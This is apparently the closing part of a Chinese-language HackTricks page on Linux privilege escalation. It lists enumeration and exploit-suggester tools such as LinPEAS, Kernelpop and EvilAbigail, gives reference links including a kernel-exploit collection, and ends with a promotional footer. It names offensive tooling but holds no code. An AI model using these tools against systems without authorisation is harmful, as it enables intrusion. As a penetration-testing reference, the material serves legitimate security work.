### **寻找 Linux 本地权限提升向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 选项)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理访问):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多脚本汇编**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考资料

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零到英雄学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
